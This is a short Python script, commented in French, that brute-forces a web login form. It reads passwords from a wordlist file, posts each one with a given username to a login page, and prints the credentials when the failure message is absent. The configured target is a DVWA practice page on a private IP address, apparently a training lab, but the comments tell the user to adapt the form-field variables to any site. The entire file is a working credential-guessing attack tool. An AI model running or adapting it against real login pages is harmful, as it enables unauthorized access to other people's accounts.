#!/usr/bin/python3

import requests
from termcolor import cprint

#---------VARIABLES A CHANGER SELON LE SITE, trouvées en faisant inspecter élement----------------#
champ_user = "username" #username
champ_password = "password" #password
button_login = "Login" #nom bouton
type_button = "submit" #type bouton
champ_failed = "Login failed" #message qd on rate le login
page_url = "http://172.16.20.128/dvwa/login.php" #page qu'on veut bruteforcer


def bruteforce(username,url):
    for password in passwords:
        password = password.strip()
        cprint("[!!] Trying to bruteforce with password: " + password, 'yellow')
        data_dictionnary = {champ_user:username, champ_password:password, button_login:type_button}
        response = requests.post(url, data=data_dictionnary)
        if champ_failed in response.content.decode('utf-8'):
            pass
        else:
            cprint("[+] Username: --> " + username,'green')
            cprint("[+] Password: --> " + password, 'green')
            exit(0)



username = input("* Enter username for specified page: ")
passwdfile =input("[*] Enter the path to the password file: ")

with open(passwdfile, "r") as passwords:
    bruteforce(username,page_url)

print("Password not in this list !")
